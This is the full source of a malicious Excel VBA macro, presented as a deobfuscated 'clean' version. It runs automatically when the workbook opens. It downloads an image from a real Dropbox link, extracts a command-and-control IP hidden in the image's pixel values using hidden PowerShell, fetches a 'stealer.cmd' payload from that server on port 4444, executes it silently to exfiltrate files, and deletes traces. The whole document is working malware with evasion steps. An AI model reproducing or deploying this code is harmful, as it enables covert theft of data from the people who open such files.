' ============================================
' VBA Macro - Clean (Non-Obfuscated) Version
' ============================================
' This macro downloads an image from Dropbox containing an encoded C2 server IP,
' extracts the IP using steganography, downloads an information stealer,
' and executes it to exfiltrate sensitive files.
' ============================================

Public ipAddress As String

' Main entry point - executed when the Excel workbook is opened
Private Sub Workbook_Open()
    Call DownloadFromDropbox
    Call GatherIpAddress
    Call DownloadStealer
    Call ExecuteStealer
End Sub

' Downloads the encoded image from Dropbox containing the C2 server IP
Sub DownloadFromDropbox()
    Dim http As Object
    Dim stream As Object
    Dim url As String
    Dim destinationPath As String
    
    ' URL of the encoded image uploaded on DropBox containing the server IP
    url = "https://www.dropbox.com/scl/fi/sl2qwhol594v5isj1akfk/img23.png?rlkey=b0sh3pigbckmktlpppa7r3ud1&st=zye6te6j&raw=1"
    
    destinationPath = ".\img.png"
    
    ' Create HTTP object to download the image
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    
    ' Set User-Agent to avoid detection
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.0.0"
    http.Send
    
    ' If request was successful, save the image
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile destinationPath, 2
        stream.Close
    End If
End Sub

' Extracts the C2 server IP address from the downloaded image
' Uses PowerShell to read the red channel of the first 4 pixels
Sub GatherIpAddress()
    Dim script As String
    Dim WshShell As Object
    Dim result As String
    
    ' PowerShell script to extract IP from image pixels
    script = "powershell -Command ""Add-Type -AssemblyName System.Drawing; " & _
             "$imagePath = '.\img.png'; " & _
             "$bitmap = [System.Drawing.Bitmap]::FromFile($imagePath); " & _
             "$pixelValues = ''; " & _
             "for ($x = 0; $x -lt 4; $x++) { " & _
             "    $color = $bitmap.GetPixel($x, 0); " & _
             "    if ($x -gt 0) { $pixelValues += '.' }; " & _
             "    $pixelValues += $color.R; " & _
             "}; " & _
             "$bitmap.Dispose(); " & _
             "Set-Content -Path '.\output.txt' -Value $pixelValues"""
    
    ' Execute the PowerShell script
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run script, 0, True
    
    ' Read the IP address from output.txt and store in global variable
    Open ".\output.txt" For Input As #1
    Line Input #1, ipAddress
    Close #1
    
    ' Clean up - delete temporary files
    Dim filePath As String
    filePath = ".\output.txt"
    Kill filePath
    
    filePath = ".\img.png"
    Kill filePath
End Sub

' Downloads the stealer script from the C2 server
Sub DownloadStealer()
    Dim http As Object
    Dim fileStream As Object
    Dim fileURL As String
    Dim destFile As String
    
    ' Build URL using the extracted IP address
    fileURL = "http://" & ipAddress & ":4444/download"
    destFile = ".\stealer.cmd"
    
    ' Create HTTP object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", fileURL, False
    http.Send
    
    ' Save stealer.cmd if request was successful
    If http.Status = 200 Then
        Set fileStream = CreateObject("ADODB.Stream")
        fileStream.Open
        fileStream.Type = 1
        fileStream.Write http.ResponseBody
        fileStream.SaveToFile destFile, 2
        fileStream.Close
    End If
End Sub

' Executes the stealer script silently and removes traces
Sub ExecuteStealer()
    Dim filePath As String
    filePath = ".\stealer.cmd"
    
    ' Create WScript.Shell object to execute the stealer
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' Execute the .cmd file without showing the window (0 = hidden)
    shell.Run """" & filePath & """", 0, True
    
    ' Delete the stealer file to remove traces
    Kill filePath
End Sub
